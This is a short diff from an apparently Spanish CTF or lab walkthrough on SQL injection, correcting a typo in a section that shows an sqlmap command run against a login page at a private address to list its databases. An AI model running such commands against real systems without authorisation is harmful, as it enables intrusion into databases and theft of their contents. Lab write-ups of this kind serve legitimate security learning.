@@ -163,7 +163,7 @@ y logramos acceso...a...nada?...bueno sabemos que es vulnerable
 
 ## EXPLOTACIÓN CON SQLMAP
 
-Si no quereis liaros la cabeza, sabiendo que hay un parámetro vulnerable usamos sqlmam:
+Si no quereis liaros la cabeza, sabiendo que hay un parámetro vulnerable usamos sqlmap:
  extraemos las bases de datos:
  ```bash
 sqlmap -u http://192.168.1.45/auth-login.php --forms --dbs --batch
